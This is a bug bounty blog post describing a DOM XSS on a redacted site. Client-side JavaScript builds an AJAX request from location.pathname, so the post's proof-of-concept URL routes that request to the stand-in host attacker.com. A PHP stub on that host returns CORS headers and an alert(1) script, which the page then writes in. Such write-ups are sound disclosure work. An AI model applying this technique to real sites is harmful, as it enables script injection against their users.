---
layout: post
title: "BugBounty | A Dom Xss"
tags: [bugbounty, Xss]
comments: true
---

I was working on a private program which i cannot disclose

I checked the js file by the way when I checked the request. Found a suspicious piece of code

**www.xxxxx.com**   domain 

**/xxxxxxxxx/**    path

https://www.xxxxx.com/xxxxxxxxx/pdp.min.js

Vuln code

![Image failed to load
e](https://raw.githubusercontent.com/Jinone/123/master/_posts/image1/t33.png)

ajax Get request response write to page

![Image failed to load
e](https://raw.githubusercontent.com/Jinone/123/master/_posts/image1/t44.png)

Normal request looks like this

Visit this site

https://www.xxxxx.com/xxxxxxxxx

ajax will make such a request

https://www.xxxxx.com/xxxxxxxxx/showProductRedemption?productCode=263625


      var prefix = location.pathname;
      var url = prefix + "/showProductRedemption?productCode=" + vpCode;
                $.ajax({
                    url: url,
                    type: "GET",
                    dataType: "html",
                    success: function(res) {
                        PDP.AjaxResponse.showProductRedemption(res);
                    },
                    error: function(res) {
                        console.error(res);
                    }
                });


But ***location.pathname*** attackers can control

So when location.pathname is set to //attacker.com

The browser will go to attacker.com

This will visit the attacker's website to get their website content

**POC**

https://www.xxxxx.com//attacker.com/xxxxxxxxx

location.pathname is //attacker.com/xxxxxxxxx
```
//attacker.com = https://attacker.com
```
ajax will request https://attacker.com/xxxxxxxxx for the response content

Attackers just need to set up their own website content

After Ajax gets the response from the attacker's website, it will write xsspayload to the page

An example with php

    <?php
    header("Access-Control-Allow-Origin: *");
    header("Access-Control-Allow-Credentials: true");
    header("Access-Control-Request-Methods:GET, POST, PUT, DELETE, OPTIONS");
    
    echo '<script>alert(1);</script>';
    ?>



So when the user visits https://www.xxxxx.com//attacker.com/xxxxxxxxx

Will trigger this dom xss![Image failed to load
e](https://raw.githubusercontent.com/Jinone/123/master/_posts/image1/t31.png)


Finally

![Image failed to load
e](https://raw.githubusercontent.com/Jinone/123/master/_posts/image1/t20.png)

Thanks!
